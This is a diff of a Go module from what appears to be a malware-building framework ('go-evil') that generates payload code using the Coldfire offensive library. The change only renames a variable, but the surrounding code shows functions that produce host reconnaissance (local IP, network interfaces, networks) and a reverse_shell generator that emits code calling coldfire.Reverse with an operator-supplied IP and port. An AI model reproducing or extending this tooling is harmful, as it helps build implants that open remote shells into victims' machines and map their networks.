@@ -90,16 +90,16 @@ func ping(value string, s_json string) ([]string, string) {
 //
 func get_local_ip(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
-	call := "get_local_ip"
+	function_call := "get_local_ip"
 
 	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(){", call),
+		fmt.Sprintf("func %s(){", function_call),
 		"spine.variable.set(coldfire.GetLocalIp())",
 		"}"})
 
 	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
 
-	return []string{fmt.Sprintf("%s()", call)}, structure.Send(data_object)
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
 }
 
 //
@@ -111,17 +111,17 @@ func get_local_ip(value string, s_json string) ([]string, string) {
 //
 func get_interface(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
-	call := "get_interface"
+	function_call := "get_interface"
 
 	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(){", call),
+		fmt.Sprintf("func %s(){", function_call),
 		"i_name, i_mac := coldfire.Iface()",
 		"spine.variable.set(i_name)",
 		"spine.variable.set(i_mac)",
 		"}"})
 	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
 
-	return []string{fmt.Sprintf("%s()", call)}, structure.Send(data_object)
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
 }
 
 //
@@ -133,10 +133,10 @@ func get_interface(value string, s_json string) ([]string, string) {
 //
 func get_interfaces(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
-	call := "get_interfaces"
+	function_call := "get_interfaces"
 
 	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(){", call),
+		fmt.Sprintf("func %s(){", function_call),
 		"interfaces := coldfire.Ifaces()",
 		"arr := structure.Create_evil_object(\"\")",
 		"for _, d_int := range interfaces{",
@@ -147,7 +147,7 @@ func get_interfaces(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
 	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")
 
-	return []string{fmt.Sprintf("%s()", call)}, structure.Send(data_object)
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
 }
 
 //
@@ -159,10 +159,10 @@ func get_interfaces(value string, s_json string) ([]string, string) {
 //
 func get_networks(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
-	call := "get_networks"
+	function_call := "get_networks"
 
 	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(){", call),
+		fmt.Sprintf("func %s(){", function_call),
 		"networks, err := coldfire.Networks()",
 		"if err != nil{",
 		"spine.log(err.Error())",
@@ -176,7 +176,7 @@ func get_networks(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
 	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")
 
-	return []string{fmt.Sprintf("%s()", call)}, structure.Send(data_object)
+	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
 }
 
 //
@@ -187,7 +187,7 @@ func get_networks(value string, s_json string) ([]string, string) {
 //
 func reverse_shell(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
-	call := "reverse_shell"
+	function_call := "reverse_shell"
 
 	arr := structure.Create_evil_object(value)
 
@@ -199,7 +199,7 @@ func reverse_shell(value string, s_json string) ([]string, string) {
 	port := arr.Get(1)
 
 	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(repr_1 []int, repr_2 int){", call),
+		fmt.Sprintf("func %s(repr_1 []int, repr_2 int){", function_call),
 		"param_1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
 		"coldfire.Reverse(param_1, repr_2)",
 		"}"})
@@ -212,5 +212,5 @@ func reverse_shell(value string, s_json string) ([]string, string) {
 
 	parameter_1 := tools.Generate_int_array_parameter(ip)
 
-	return []string{fmt.Sprintf("%s(%s, %d)", call, parameter_1, i_port)}, structure.Send(data_object)
+	return []string{fmt.Sprintf("%s(%s, %d)", function_call, parameter_1, i_port)}, structure.Send(data_object)
 }
